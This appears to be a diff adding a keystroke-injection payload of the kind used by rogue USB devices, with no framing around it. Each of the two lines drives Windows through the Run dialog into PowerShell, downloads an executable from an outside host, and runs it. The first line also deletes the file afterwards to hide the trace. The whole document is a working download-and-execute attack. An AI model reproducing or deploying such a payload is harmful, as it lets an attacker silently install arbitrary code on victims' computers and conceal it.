@@ -1,0 +1,2 @@
+<RLS><WIN+r><RLS><SLP(500)><RLS>powershell<ENTER><RLS><SLP(500)><RLS>(New-Object Net.WebClient).DownloadFile("http://xswxm.com/0", "0.exe")<ENTER><RLS><SLP(2000)><RLS>./0.exe<ENTER><RLS><SLP(1000)><RLS>del 0.exe<ENTER><RLS><RLS>exit<ENTER><RLS>
+<RLS><WIN+r><RLS><SLP(500)><RLS>powershell<ENTER><RLS><SLP(500)><RLS>(New-Object Net.WebClient).DownloadFile("http://xswxm.com/0", "0.exe")<ENTER><RLS><SLP(2000)><RLS>./0.exe<ENTER><RLS>
